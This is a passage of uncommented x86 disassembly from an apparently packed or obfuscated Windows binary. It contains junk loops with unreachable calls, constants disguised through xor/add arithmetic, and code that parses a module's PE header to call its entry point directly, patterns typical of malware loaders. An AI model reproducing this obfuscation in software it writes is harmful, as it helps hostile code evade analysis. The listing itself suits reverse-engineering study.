  401ff1:	jne    0x40200a
  401ff7:	push   0x887e
  401ffc:	push   0x81aa
  402001:	push   DWORD PTR [ebp-0x1c]
  402004:	call   DWORD PTR ds:0x42ed41
  40200a:	mov    ebx,DWORD PTR ds:0x42c018
  402010:	dec    ebx
  402011:	mov    DWORD PTR ds:0x42c018,ebx
  402017:	jmp    0x401fdd
  40201c:	and    DWORD PTR ds:0x42a018,0x0
  402026:	mov    ebx,DWORD PTR ds:0x42a018
  40202c:	inc    ebx
  40202d:	mov    DWORD PTR ds:0x42a018,ebx
  402033:	cmp    DWORD PTR ds:0x42a018,0x27
  40203a:	jne    0x402051
  402040:	push   DWORD PTR [ebp-0x10]
  402043:	push   0x429008
  402048:	push   DWORD PTR [ebp-0xc]
  40204b:	call   DWORD PTR ds:0x42ed45
  402051:	cmp    DWORD PTR ds:0x42a018,0x17
  402058:	jb     0x402026
  40205e:	xor    ebx,0x6fac
  402064:	xor    eax,esi
  402066:	add    eax,edi
  402068:	mov    ds:0x42ebcd,eax
  40206d:	sub    ebx,ebx
  40206f:	mov    eax,ds:0x42e435
  402074:	mov    eax,DWORD PTR [eax+0x18c]
  40207a:	sbb    DWORD PTR ds:0x42c004,ecx
  402080:	mov    eax,DWORD PTR [eax]
  402082:	mov    DWORD PTR [ebp-0x68],eax
  402085:	or     DWORD PTR ds:0x42900c,0x1063
  40208f:	mov    ebx,0xf89c85b1
  402094:	mov    DWORD PTR [ebp-0x10],ebx
  402097:	dec    DWORD PTR ds:0x429024
  40209d:	mov    DWORD PTR [ebp-0x10],ebx
  4020a0:	sub    DWORD PTR ds:0x429028,0x6632
  4020aa:	mov    DWORD PTR [ebp-0x10],ebx
  4020ad:	and    DWORD PTR ds:0x42b018,0x42a00c
  4020b7:	mov    DWORD PTR [ebp-0x1c],ecx
  4020ba:	mov    DWORD PTR [ebp-0x10],ebx
  4020bd:	add    DWORD PTR ds:0x42a008,0x61a5
  4020c7:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  4020ce:	adc    DWORD PTR ds:0x42a004,0x6791
  4020d8:	mov    eax,DWORD PTR [ebp-0x8]
  4020db:	and    DWORD PTR ds:0x42d008,0x429018
  4020e5:	xor    eax,esi
  4020e7:	add    eax,edi
  4020e9:	mov    DWORD PTR ds:0x42c00c,0x48a6
  4020f3:	jmp    0x4022be
  4020f8:	add    eax,eax
  4020fa:	mov    eax,DWORD PTR [ebp-0xc]
  4020fd:	adc    DWORD PTR ds:0x42c000,0x10b0
  402107:	mov    ecx,DWORD PTR [ebp-0x18]
  40210a:	xor    eax,esi
  40210c:	sub    DWORD PTR ds:0x42b00c,0x42a004
  402116:	lea    eax,[eax+ecx*1+0x3272dd]
  40211d:	push   eax
  40211e:	mov    DWORD PTR ds:0x42a014,0x1b
  402128:	cmp    DWORD PTR ds:0x42a014,0x0
  40212f:	je     0x40217e
  402135:	cmp    DWORD PTR ds:0x42a014,0x6
  40213c:	jne    0x402148
  402142:	call   DWORD PTR ds:0x42ed51
  402148:	cmp    DWORD PTR ds:0x42a014,0x7
  40214f:	jne    0x402160
  402155:	mov    eax,ds:0x42a014
  40215a:	dec    eax
  40215b:	mov    ds:0x42a014,eax
  402160:	mov    eax,ds:0x42a014
  402165:	dec    eax
  402166:	mov    ds:0x42a014,eax
  40216b:	jmp    0x402128
  402170:	xor    eax,eax
  402172:	add    eax,DWORD PTR ds:0x42a008
  402178:	sub    DWORD PTR ds:0x429024,eax
  40217e:	mov    eax,DWORD PTR [ebp-0x1c]
  402181:	adc    DWORD PTR ds:0x429020,0x429028
  40218b:	xor    eax,esi
  40218d:	lea    eax,[ebp+eax*1+0x3272e5]
  402194:	push   eax
  402195:	add    DWORD PTR ds:0x42900c,0x1bda
  40219f:	mov    eax,ds:0x42e435
  4021a4:	push   DWORD PTR [eax+0x1bc]
  4021aa:	xor    DWORD PTR ds:0x42c018,0x429018
  4021b4:	call   0x4029b7
  4021b9:	and    DWORD PTR ds:0x42b018,0x0
  4021c3:	jmp    0x4021d5
  4021c8:	mov    ecx,DWORD PTR ds:0x42b018
  4021ce:	inc    ecx
  4021cf:	mov    DWORD PTR ds:0x42b018,ecx
  4021d5:	cmp    DWORD PTR ds:0x42b018,0x1d
  4021dc:	jae    0x4021fa
  4021e2:	cmp    DWORD PTR ds:0x42b018,0x27
  4021e9:	jne    0x4021f5
  4021ef:	call   DWORD PTR ds:0x42ed55
  4021f5:	jmp    0x4021c8
  4021fa:	mov    eax,DWORD PTR [ebp-0xc]
  4021fd:	mov    ecx,DWORD PTR [ebp-0x18]
  402200:	and    DWORD PTR ds:0x429010,0x0
  40220a:	mov    edx,DWORD PTR ds:0x429010
  402210:	inc    edx
  402211:	mov    DWORD PTR ds:0x429010,edx
  402217:	cmp    DWORD PTR ds:0x429010,0x9
  40221e:	jne    0x402245
  402224:	push   DWORD PTR [ebp-0x20]
  402227:	push   DWORD PTR [ebp-0x14]
  40222a:	push   0x42a010
  40222f:	push   0x39f6
  402234:	push   DWORD PTR [ebp-0x10]
  402237:	push   0x1415
  40223c:	push   DWORD PTR [ebp-0x14]
  40223f:	call   DWORD PTR ds:0x42ed59
  402245:	cmp    DWORD PTR ds:0x429010,0x8
  40224c:	jne    0x40225f
  402252:	mov    edx,DWORD PTR ds:0x429010
  402258:	inc    edx
  402259:	mov    DWORD PTR ds:0x429010,edx
  40225f:	cmp    DWORD PTR ds:0x429010,0x17
  402266:	jb     0x40220a
  40226c:	and    DWORD PTR ds:0x42d01c,0x0
  402276:	jmp    0x402288
  40227b:	mov    edx,DWORD PTR ds:0x42d01c
  402281:	inc    edx
  402282:	mov    DWORD PTR ds:0x42d01c,edx
  402288:	cmp    DWORD PTR ds:0x42d01c,0x16
  40228f:	jae    0x4022b5
  402295:	cmp    DWORD PTR ds:0x42d01c,0x1f
  40229c:	jne    0x4022b0
  4022a2:	push   DWORD PTR [ebp-0xc]
  4022a5:	push   0x42e12b
  4022aa:	call   DWORD PTR ds:0x42ed5d
  4022b0:	jmp    0x40227b
  4022b5:	xor    eax,esi
  4022b7:	lea    eax,[ecx+eax*1+0x3272dd]
  4022be:	and    DWORD PTR ds:0x429000,0x0
  4022c8:	jmp    0x4022da
  4022cd:	mov    edx,DWORD PTR ds:0x429000
  4022d3:	inc    edx
  4022d4:	mov    DWORD PTR ds:0x429000,edx
  4022da:	cmp    DWORD PTR ds:0x429000,0x1a
  4022e1:	jae    0x402370
  4022e7:	cmp    DWORD PTR ds:0x429000,0x7
  4022ee:	jne    0x402308
  4022f4:	push   0x42e196
  4022f9:	push   0x1
  4022fb:	push   0x0
  4022fd:	push   0x72dd
  402302:	call   DWORD PTR ds:0x42ed61
  402308:	cmp    DWORD PTR ds:0x429000,0x6
  40230f:	jne    0x402322
  402315:	mov    edx,DWORD PTR ds:0x429000
  40231b:	inc    edx
  40231c:	mov    DWORD PTR ds:0x429000,edx
  402322:	jmp    0x4022cd
  402327:	and    DWORD PTR ds:0x42a014,0x0
  402331:	mov    edx,DWORD PTR ds:0x42a014
  402337:	inc    edx
  402338:	mov    DWORD PTR ds:0x42a014,edx
  40233e:	cmp    DWORD PTR ds:0x42a014,0x1b
  402345:	jne    0x402359
  40234b:	push   0x42d004
  402350:	push   DWORD PTR [ebp-0x18]
  402353:	call   DWORD PTR ds:0x42ed65
  402359:	cmp    DWORD PTR ds:0x42a014,0x11
  402360:	jb     0x402331
  402366:	and    DWORD PTR ds:0x42d018,0x567b
  402370:	mov    ecx,DWORD PTR [ebp-0xc]
  402373:	xor    edx,0x27b9
  402379:	mov    edx,DWORD PTR [ebp-0xc]
  40237c:	add    DWORD PTR ds:0x42a010,0x42d014
  402386:	xor    edx,esi
  402388:	xor    ecx,esi
  40238a:	and    DWORD PTR ds:0x42c00c,0x48dd
  402394:	add    ecx,edx
  402396:	mov    edx,DWORD PTR [ebp-0xc]
  402399:	neg    DWORD PTR ds:0x42c00c
  40239f:	xor    edx,esi
  4023a1:	lea    ecx,[ecx+edx*1+0x975897]
  4023a8:	mov    DWORD PTR ds:0x42b018,0x21
  4023b2:	mov    DWORD PTR [ebp-0x18],eax
  4023b5:	mov    DWORD PTR ds:0x42a010,0x55c5
  4023bf:	cmp    eax,ecx
  4023c1:	mov    DWORD PTR ds:0x42c01c,0x1ffa
  4023cb:	jbe    0x4020f8
  4023d1:	mov    eax,DWORD PTR [ebp+0xc]
  4023d4:	mov    ds:0x42e2b9,eax
  4023d9:	mov    eax,DWORD PTR [ebp+0x10]
  4023dc:	mov    ds:0x42e50d,eax
  4023e1:	mov    eax,ds:0x42e2b9
  4023e6:	mov    ecx,DWORD PTR [ebp-0x28]
  4023e9:	sub    eax,edi
  4023eb:	xor    eax,esi
  4023ed:	mov    DWORD PTR [ecx],eax
  4023ef:	mov    eax,DWORD PTR [ebp-0x24]
  4023f2:	cmp    eax,0xf89c85b5
  4023f7:	jne    0x4024d1
  4023fd:	lea    eax,[ebp-0x38]
  402400:	mov    DWORD PTR [ebp-0x70],eax
  402403:	lea    eax,[ebp+0x4]
  402406:	mov    DWORD PTR [ebp-0x38],eax
  402409:	mov    eax,DWORD PTR [ebp-0x38]
  40240c:	test   eax,eax
  40240e:	je     0x402987
  402414:	mov    eax,DWORD PTR [ebp-0x20]
  402417:	mov    eax,DWORD PTR [ebp-0xc]
  40241a:	mov    eax,DWORD PTR [ebp-0x8]
  40241d:	mov    DWORD PTR [ebp+0xc],eax
  402420:	mov    eax,eax
  402422:	mov    eax,ds:0x42e435
  402427:	mov    eax,DWORD PTR [eax+0x1c8]
  40242d:	mov    eax,DWORD PTR [eax]
  40242f:	cdq    
  402430:	mov    ebx,eax
  402432:	mov    eax,0xfabdbeed
  402437:	add    ebx,eax
  402439:	adc    edx,0xffffffff
  40243c:	and    DWORD PTR [ebp-0x10],0x0
  402440:	xor    edx,0x0
  402443:	mov    DWORD PTR [ebp-0x54],edx
  402446:	mov    edx,DWORD PTR [ebp+0xc]
  402449:	mov    DWORD PTR [ebp-0x14],edx
  40244c:	mov    ecx,0x8a29a127
  402451:	xor    ebx,ecx
  402453:	add    DWORD PTR [ebp-0x14],eax
  402456:	mov    edx,DWORD PTR [ebp-0x14]
  402459:	adc    DWORD PTR [ebp-0x10],0xffffffff
  40245d:	xor    edx,ecx
  40245f:	mov    DWORD PTR [ebp-0x4c],edx
  402462:	mov    edx,DWORD PTR [ebp-0x10]
  402465:	xor    edx,0x0
  402468:	mov    DWORD PTR [ebp-0x48],edx
  40246b:	cmp    DWORD PTR [ebp-0x4c],ebx
  40246e:	jne    0x402480
  402474:	mov    edx,DWORD PTR [ebp-0x54]
  402477:	cmp    DWORD PTR [ebp-0x48],edx
  40247a:	je     0x4024af
  402480:	mov    edx,DWORD PTR ds:0x42e435
  402486:	mov    edx,DWORD PTR [edx+0x1c0]
  40248c:	mov    edx,DWORD PTR [edx]
  40248e:	xor    ebx,ebx
  402490:	add    edx,eax
  402492:	adc    ebx,0xffffffff
  402495:	xor    edx,ecx
  402497:	xor    ebx,0x0
  40249a:	cmp    edx,0x70941fc9
  4024a0:	jne    0x402987
  4024a6:	cmp    ebx,0xffffffff
  4024a9:	jne    0x402987
  4024af:	mov    edx,DWORD PTR ds:0x42e4b1
  4024b5:	mov    ebx,DWORD PTR ds:0x42e4b9
  4024bb:	xor    edx,ebx
  4024bd:	mov    DWORD PTR ds:0x42e4b1,edx
  4024c3:	mov    ebx,DWORD PTR ds:0x42e4b1
  4024c9:	mov    edx,DWORD PTR [ebp-0x38]
  4024cc:	jmp    0x402946
  4024d1:	mov    eax,DWORD PTR [ebp-0x34]
  4024d4:	cmp    eax,0xf89c85b2
  4024d9:	je     0x402536
  4024df:	mov    eax,DWORD PTR [ebp-0x8]
  4024e2:	mov    ecx,DWORD PTR [ebp-0x30]
  4024e5:	xor    eax,esi
  4024e7:	add    eax,edi
  4024e9:	cmp    eax,ecx
  4024eb:	je     0x402536
  4024f1:	mov    eax,ds:0x42e435
  4024f6:	mov    eax,DWORD PTR [eax+0x194]
  4024fc:	mov    ecx,DWORD PTR [eax]
  4024fe:	mov    eax,DWORD PTR [ecx+0x3c]
  402501:	push   DWORD PTR ds:0x42e50d
  402507:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40250b:	push   DWORD PTR ds:0x42e2b9
  402511:	add    eax,ecx
  402513:	mov    ecx,DWORD PTR ds:0x42e435
  402519:	mov    ecx,DWORD PTR [ecx+0x194]
  40251f:	push   DWORD PTR [ecx]
  402521:	call   eax
  402523:	mov    ecx,DWORD PTR ds:0x42e435
  402529:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40252f:	mov    DWORD PTR [ecx],eax
  402531:	jmp    0x402987
  402536:	mov    eax,DWORD PTR [ebp-0x8]
  402539:	mov    ecx,DWORD PTR [ebp-0x68]
  40253c:	xor    eax,esi
  40253e:	add    eax,edi
  402540:	cmp    eax,ecx
  402542:	jne    0x402850
  402548:	mov    eax,DWORD PTR [ebp-0x8]
  40254b:	mov    ecx,DWORD PTR ds:0x42e435
  402551:	mov    ecx,DWORD PTR [ecx+0x198]
  402557:	xor    eax,esi
  402559:	add    eax,edi
  40255b:	cmp    eax,DWORD PTR [ecx]
  40255d:	jne    0x40257c
  402563:	mov    eax,DWORD PTR [ebp-0x8]
  402566:	push   0xf89c85b5
  40256b:	xor    eax,esi
  40256d:	add    eax,edi
  40256f:	push   eax
  402570:	push   ebx
  402571:	push   DWORD PTR [ebp-0xc]
  402574:	push   DWORD PTR [ebp-0x8]
  402577:	call   0x40a327
  40257c:	mov    eax,DWORD PTR [ebp-0xc]
  40257f:	mov    DWORD PTR [ebp-0x3c],eax
  402582:	mov    eax,DWORD PTR [ebp-0x8]
  402585:	mov    DWORD PTR [ebp-0x18],eax
  402588:	mov    eax,DWORD PTR [ebp-0x18]
  40258b:	xor    eax,esi
  40258d:	add    eax,edi
  40258f:	mov    DWORD PTR [ebp+0x10],eax
  402592:	mov    eax,ds:0x42e2b5
  402597:	mov    eax,DWORD PTR [eax]
  402599:	mov    DWORD PTR [ebp+0x10],eax
  40259c:	mov    eax,ds:0x42e4bd
  4025a1:	mov    eax,DWORD PTR [eax]
  4025a3:	mov    DWORD PTR [ebp-0x1c],eax
  4025a6:	mov    DWORD PTR [ebp+0xc],0xf89c87b5
  4025ad:	mov    eax,DWORD PTR [ebp+0xc]
  4025b0:	xor    eax,esi
  4025b2:	add    eax,edi
  4025b4:	mov    DWORD PTR [ebp+0xc],eax
  4025b7:	mov    eax,ds:0x42e435
  4025bc:	mov    DWORD PTR [ebp+0xc],eax
  4025bf:	mov    eax,DWORD PTR [ebp+0x10]
  4025c2:	mov    DWORD PTR [ebp+0xc],eax
  4025c5:	mov    eax,DWORD PTR [ebp+0xc]
  4025c8:	push   0x4
  4025ca:	pop    ecx
  4025cb:	sub    ecx,eax
  4025cd:	add    ecx,DWORD PTR [ebp-0x1c]
  4025d0:	mov    DWORD PTR [ebp-0x28],0xf89c85f5
  4025d7:	mov    DWORD PTR [ebp+0x10],ecx
  4025da:	mov    DWORD PTR [ebp-0xcc],ebx
  4025e0:	mov    eax,DWORD PTR [ebp+0xc]
  4025e3:	mov    DWORD PTR [ebp-0xc8],eax
  4025e9:	mov    eax,DWORD PTR [ebp+0x10]
  4025ec:	mov    DWORD PTR [ebp-0xc4],eax
  4025f2:	mov    eax,DWORD PTR [ebp-0x28]
  4025f5:	xor    eax,esi
  4025f7:	add    eax,edi
  4025f9:	mov    DWORD PTR [ebp-0xc0],eax
  4025ff:	lea    eax,[ebp-0x78]
  402602:	mov    DWORD PTR [ebp-0xbc],eax
  402608:	mov    eax,DWORD PTR [ebp-0xcc]
  40260e:	xor    eax,esi
  402610:	add    eax,edi
  402612:	mov    DWORD PTR [ebp-0xcc],eax
  402618:	lea    eax,[ebp-0xcc]
  40261e:	push   eax
  40261f:	mov    eax,DWORD PTR [ebp-0x3c]
  402622:	xor    eax,esi
  402624:	add    eax,edi
  402626:	push   eax
  402627:	mov    eax,ds:0x42e455
  40262c:	push   0x42e3ab
  402631:	push   DWORD PTR [eax]
  402633:	call   0x40508b
  402638:	mov    eax,DWORD PTR [ebp+0xc]
  40263b:	mov    ecx,DWORD PTR [ebp+0x10]
  40263e:	mov    DWORD PTR [ebp-0x6c],ecx
  402641:	mov    ecx,DWORD PTR [ebp-0x18]
  402644:	xor    ecx,esi
  402646:	mov    DWORD PTR [ebp-0x1c],eax
  402649:	add    ecx,edi
  40264b:	jmp    0x4027f1
  402650:	lea    edx,[ecx+eax*1]
  402653:	mov    DWORD PTR [ebp+0x10],edx
  402656:	mov    edx,DWORD PTR [ebp-0x6c]
  402659:	sub    edx,ecx
  40265b:	mov    DWORD PTR [ebp+0xc],edx
  40265e:	mov    edx,DWORD PTR [ebp+0xc]
  402661:	mov    DWORD PTR [ebp-0x40],edx
  402664:	mov    edx,DWORD PTR [ebp+0x10]
  402667:	mov    DWORD PTR [ebp-0x44],0xf89c85b5
  40266e:	mov    DWORD PTR [ebp-0x64],edx
  402671:	mov    DWORD PTR [ebp+0x10],0xf89c85b2
  402678:	mov    edx,DWORD PTR [ebp-0x44]
  40267b:	xor    edx,esi
  40267d:	add    edx,edi
  40267f:	mov    DWORD PTR [ebp+0xc],edx
  402682:	mov    edx,DWORD PTR [ebp-0x44]
  402685:	xor    edx,esi
  402687:	add    edx,edi
  402689:	mov    DWORD PTR [ebp-0x4],edx
  40268c:	mov    DWORD PTR [ebp-0x60],0xf89c85d5
  402693:	mov    DWORD PTR [ebp-0x5c],0xf89c85bc
  40269a:	mov    edx,DWORD PTR [ebp-0x44]
  40269d:	mov    ebx,DWORD PTR [ebp-0x40]
  4026a0:	xor    edx,esi
  4026a2:	add    edx,edi
  4026a4:	cmp    ebx,edx
  4026a6:	je     0x4027e5
  4026ac:	mov    eax,DWORD PTR [ebp+0x10]
  4026af:	xor    eax,esi
  4026b1:	mov    edx,0xffcd8d23
  4026b6:	sub    edx,eax
  4026b8:	add    edx,DWORD PTR [ebp-0x40]
  4026bb:	mov    eax,DWORD PTR [ebp+0x10]
  4026be:	mov    ebx,DWORD PTR [ebp+0xc]
  4026c1:	xor    eax,esi
  4026c3:	add    eax,edi
  4026c5:	imul   eax,ebx
  4026c8:	cmp    eax,edx
  4026ca:	ja     0x4027e2
  4026d0:	mov    edx,DWORD PTR [ebp+0xc]
  4026d3:	mov    eax,DWORD PTR [ebp-0x40]
  4026d6:	mov    ebx,DWORD PTR [ebp-0x60]
  4026d9:	sub    eax,edx
  4026db:	xor    ebx,esi
  4026dd:	xor    edx,edx
  4026df:	add    ebx,edi
  4026e1:	div    ebx
  4026e3:	mov    DWORD PTR [ebp-0x4],eax
  4026e6:	mov    eax,DWORD PTR [ebp-0x5c]
  4026e9:	mov    edx,DWORD PTR [ebp-0x4]
  4026ec:	xor    eax,esi
  4026ee:	add    eax,edi
  4026f0:	cmp    edx,eax
  4026f2:	jbe    0x402702
  4026f8:	mov    eax,DWORD PTR [ebp-0x5c]
  4026fb:	xor    eax,esi
  4026fd:	add    eax,edi
  4026ff:	mov    DWORD PTR [ebp-0x4],eax
  402702:	mov    eax,DWORD PTR [ebp-0x60]
  402705:	mov    edx,DWORD PTR [ebp-0x4]
  402708:	xor    eax,esi
  40270a:	add    eax,edi
  40270c:	imul   eax,edx
  40270f:	mov    DWORD PTR [ebp-0x4],eax
  402712:	mov    eax,DWORD PTR [ebp-0x44]
  402715:	mov    edx,DWORD PTR [ebp-0x4]
  402718:	xor    eax,esi
  40271a:	add    eax,edi
  40271c:	cmp    edx,eax
  40271e:	je     0x4027cb
  402724:	mov    eax,DWORD PTR [ebp-0x4]
  402727:	mov    DWORD PTR [ebp-0x24],eax
  40272a:	mov    eax,DWORD PTR [ebp+0xc]
  40272d:	add    eax,DWORD PTR [ebp-0x64]
  402730:	mov    DWORD PTR [ebp-0x28],0xf89c85b5
  402737:	mov    DWORD PTR [ebp-0x48],eax
  40273a:	mov    eax,0xf89c85b2
  40273f:	mov    DWORD PTR [ebp-0x50],eax
  402742:	mov    DWORD PTR [ebp-0x10],0xf89c85b3
  402749:	mov    DWORD PTR [ebp-0x10],0xf89c85b0
  402750:	mov    DWORD PTR [ebp-0x54],eax
  402753:	mov    eax,DWORD PTR [ebp-0x28]
  402756:	xor    eax,esi
  402758:	add    eax,edi
  40275a:	jmp    0x402787
  40275f:	mov    eax,DWORD PTR [ebp-0x54]
  402762:	mov    edx,DWORD PTR [ebp-0x4]
  402765:	xor    eax,esi
  402767:	add    eax,edi
  402769:	imul   eax,edx
  40276c:	mov    edx,DWORD PTR [ebp-0x48]
  40276f:	mov    BYTE PTR [eax+edx*1],0x0
  402773:	mov    eax,DWORD PTR [ebp-0x10]
  402776:	mov    edx,DWORD PTR [ebp-0x50]
  402779:	xor    eax,esi
  40277b:	xor    edx,esi
  40277d:	add    eax,edi
  40277f:	add    edx,edi
  402781:	imul   eax,edx
  402784:	add    eax,DWORD PTR [ebp-0x4]
  402787:	mov    DWORD PTR [ebp-0x4],eax
  40278a:	mov    eax,DWORD PTR [ebp-0x4]
  40278d:	mov    edx,DWORD PTR [ebp-0x24]
  402790:	cmp    edx,eax
  402792:	jb     0x40275f
  402798:	mov    eax,DWORD PTR [ebp-0x50]
  40279b:	mov    edx,DWORD PTR [ebp-0x24]
  40279e:	xor    eax,esi
  4027a0:	add    eax,edi
  4027a2:	imul   eax,edx
  4027a5:	mov    edx,DWORD PTR [ebp-0x28]
  4027a8:	xor    edx,esi
  4027aa:	add    edx,edi
  4027ac:	or     eax,edx
  4027ae:	mov    edx,DWORD PTR [ebp+0x10]
  4027b1:	xor    edx,esi
  4027b3:	add    eax,edx
  4027b5:	mov    edx,DWORD PTR [ebp+0x10]
  4027b8:	xor    edx,esi
  4027ba:	add    eax,edx
  4027bc:	mov    edx,DWORD PTR [ebp+0xc]
  4027bf:	lea    eax,[eax+edx*1+0x64e5ba]
  4027c6:	jmp    0x4027da
  4027cb:	mov    eax,DWORD PTR [ebp+0x10]
  4027ce:	mov    edx,DWORD PTR [ebp+0xc]
  4027d1:	xor    eax,esi
  4027d3:	lea    eax,[eax+edx*1+0x3272dd]
  4027da:	mov    DWORD PTR [ebp+0xc],eax
  4027dd:	jmp    0x4026ac
  4027e2:	mov    eax,DWORD PTR [ebp-0x1c]
  4027e5:	mov    edx,DWORD PTR [ebp-0x3c]
  4027e8:	xor    edx,esi
  4027ea:	lea    ecx,[ecx+edx*1+0x3272dd]
  4027f1:	lea    edx,[ecx-0x3272dd]
  4027f7:	xor    edx,esi
  4027f9:	cmp    edx,0xf89c95b5
  4027ff:	jne    0x402650
  402805:	mov    ecx,DWORD PTR [ebp-0x18]
  402808:	mov    edx,DWORD PTR [ebp-0x3c]
  40280b:	mov    ebx,DWORD PTR [ebp-0x18]
  40280e:	xor    edx,esi
  402810:	mov    dl,BYTE PTR [edx+eax*1+0x3272dd]
  402817:	xor    ecx,esi
  402819:	mov    cl,BYTE PTR [ecx+eax*1+0x3272dd]
  402820:	xor    ebx,esi
  402822:	mov    BYTE PTR [ebx+eax*1+0x3272dd],dl
  402829:	mov    edx,DWORD PTR [ebp-0x3c]
  40282c:	xor    edx,esi
  40282e:	mov    BYTE PTR [edx+eax*1+0x3272dd],cl
  402835:	mov    eax,DWORD PTR [ebp-0x3c]
  402838:	mov    eax,DWORD PTR [ebp-0x8]
  40283b:	xor    eax,esi
  40283d:	add    eax,edi
  40283f:	mov    ds:0x42e4b9,eax
  402844:	mov    eax,DWORD PTR [ebp-0x8]
  402847:	xor    eax,esi
  402849:	add    eax,edi
  40284b:	mov    ds:0x42e4b1,eax
  402850:	lea    eax,[ebp-0x2c]
  402853:	mov    DWORD PTR [ebp-0x88],eax
  402859:	lea    eax,[ebp+0x4]
  40285c:	mov    DWORD PTR [ebp-0x2c],eax
  40285f:	mov    eax,DWORD PTR [ebp-0x2c]
  402862:	test   eax,eax
  402864:	je     0x402987
  40286a:	mov    DWORD PTR [ebp-0x80],0xf152c3a
  402871:	mov    DWORD PTR [ebp-0x74],0x712ed0f
  402878:	mov    DWORD PTR [ebp-0x7c],0x373fc2d
  40287f:	mov    DWORD PTR [ebp-0x84],0x72670a1d
  402889:	call   0x409f81
  40288e:	mov    eax,DWORD PTR [ebp-0x20]
  402891:	mov    eax,DWORD PTR [ebp-0xc]
  402894:	mov    eax,DWORD PTR [ebp-0x8]
  402897:	mov    DWORD PTR [ebp+0xc],eax
  40289a:	mov    eax,eax
  40289c:	mov    eax,ds:0x42e435
  4028a1:	mov    eax,DWORD PTR [eax+0x1c8]
  4028a7:	mov    eax,DWORD PTR [eax]
  4028a9:	cdq    
  4028aa:	mov    ebx,eax
  4028ac:	mov    eax,0xfabdbeed
  4028b1:	add    ebx,eax
  4028b3:	adc    edx,0xffffffff
  4028b6:	and    DWORD PTR [ebp-0x10],0x0
  4028ba:	xor    edx,0x0
  4028bd:	mov    DWORD PTR [ebp-0x54],edx
  4028c0:	mov    edx,DWORD PTR [ebp+0xc]
  4028c3:	mov    DWORD PTR [ebp-0x14],edx
  4028c6:	mov    ecx,0x8a29a127
  4028cb:	xor    ebx,ecx
  4028cd:	add    DWORD PTR [ebp-0x14],eax
  4028d0:	mov    edx,DWORD PTR [ebp-0x14]
  4028d3:	adc    DWORD PTR [ebp-0x10],0xffffffff
  4028d7:	xor    edx,ecx
  4028d9:	mov    DWORD PTR [ebp-0x4c],edx
  4028dc:	mov    edx,DWORD PTR [ebp-0x10]
  4028df:	xor    edx,0x0
  4028e2:	mov    DWORD PTR [ebp-0x48],edx
  4028e5:	cmp    DWORD PTR [ebp-0x4c],ebx
  4028e8:	jne    0x4028fa
  4028ee:	mov    edx,DWORD PTR [ebp-0x54]
  4028f1:	cmp    DWORD PTR [ebp-0x48],edx
  4028f4:	je     0x402929
  4028fa:	mov    edx,DWORD PTR ds:0x42e435
  402900:	mov    edx,DWORD PTR [edx+0x1c0]
  402906:	mov    edx,DWORD PTR [edx]
  402908:	xor    ebx,ebx
  40290a:	add    edx,eax
  40290c:	adc    ebx,0xffffffff
  40290f:	xor    edx,ecx
  402911:	xor    ebx,0x0
  402914:	cmp    edx,0x70941fc9
  40291a:	jne    0x402987
  402920:	cmp    ebx,0xffffffff
  402923:	jne    0x402987
  402929:	mov    edx,DWORD PTR ds:0x42e4b1
  40292f:	mov    ebx,DWORD PTR ds:0x42e4b9
  402935:	xor    edx,ebx
  402937:	mov    DWORD PTR ds:0x42e4b1,edx
  40293d:	mov    ebx,DWORD PTR ds:0x42e4b1
  402943:	mov    edx,DWORD PTR [ebp-0x2c]
  402946:	add    DWORD PTR [edx],ebx
  402948:	mov    edx,DWORD PTR [ebp+0xc]
  40294b:	xor    esi,edx
  40294d:	mov    edx,DWORD PTR ds:0x42e4b1
  402953:	add    esi,edi
  402955:	xor    ebx,ebx
  402957:	add    esi,eax
  402959:	adc    ebx,0xffffffff
  40295c:	xor    edi,edi
  40295e:	xor    esi,ecx
  402960:	xor    ebx,0x0
  402963:	add    edx,eax
  402965:	adc    edi,0xffffffff
  402968:	xor    edx,ecx
  40296a:	xor    edi,0x0
  40296d:	cmp    edx,esi
  40296f:	jne    0x402987
  402975:	cmp    edi,ebx
  402977:	jne    0x402987
  40297d:	mov    eax,ds:0x42e4b1
  402982:	mov    ds:0x42e4b9,eax
  402987:	mov    eax,ds:0x42e435
  40298c:	push   0x4
  40298e:	add    eax,0x1cc
  402993:	push   eax
  402994:	lea    eax,[ebp-0x20]
  402997:	push   eax
  402998:	call   0x4029b7
  40299d:	mov    eax,DWORD PTR [ebp-0x20]
  4029a0:	mov    eax,DWORD PTR [eax]
  4029a2:	pop    ebx
  4029a3:	pop    edi
  4029a4:	pop    esi
  4029a5:	leave  
  4029a6:	ret    0xc
  4029a9:	xor    eax,eax
  4029ab:	adc    DWORD PTR ds:0x429018,0x42b01c
  4029b5:	inc    eax
  4029b6:	ret    
  4029b7:	push   ebp
  4029b8:	mov    ebp,esp
  4029ba:	sub    esp,0x10
  4029bd:	mov    eax,0xf89c85b5
  4029c2:	and    DWORD PTR ds:0x42a004,0x0
  4029cc:	jmp    0x4029de
  4029d1:	mov    ecx,DWORD PTR ds:0x42a004
  4029d7:	inc    ecx
  4029d8:	mov    DWORD PTR ds:0x42a004,ecx
  4029de:	cmp    DWORD PTR ds:0x42a004,0x19
  4029e5:	jae    0x402a37
  4029eb:	cmp    DWORD PTR ds:0x42a004,0x8
  4029f2:	jne    0x402a18
  4029f8:	push   0x58e0
  4029fd:	push   0x42d014
  402a02:	push   DWORD PTR [ebp-0x28]
  402a05:	push   0x42e0f3
  402a0a:	push   0x48f7
  402a0f:	push   DWORD PTR [ebp-0x28]
  402a12:	call   DWORD PTR ds:0x42ed6d
  402a18:	cmp    DWORD PTR ds:0x42a004,0x7
  402a1f:	jne    0x402a32
  402a25:	mov    ecx,DWORD PTR ds:0x42a004
  402a2b:	inc    ecx
  402a2c:	mov    DWORD PTR ds:0x42a004,ecx
  402a32:	jmp    0x4029d1
  402a37:	mov    DWORD PTR [ebp-0x4],eax
  402a3a:	mov    DWORD PTR [ebp-0x8],0xf89c85b2
  402a41:	movzx  edx,WORD PTR ds:0x42901c
  402a48:	xor    edx,DWORD PTR ds:0x429024
  402a4e:	mov    DWORD PTR ds:0x42901c,edx
  402a54:	mov    ecx,DWORD PTR [ebp-0x4]
  402a57:	sbb    edx,0x1c35
  402a5d:	push   esi
  402a5e:	mov    esi,DWORD PTR ds:0x42c01c
  402a64:	sbb    esi,DWORD PTR ds:0x42d018
  402a6a:	mov    DWORD PTR ds:0x42c01c,esi
  402a70:	mov    edx,0x7510896
  402a75:	mov    esi,DWORD PTR ds:0x42a00c
  402a7b:	add    DWORD PTR ds:0x42d008,esi
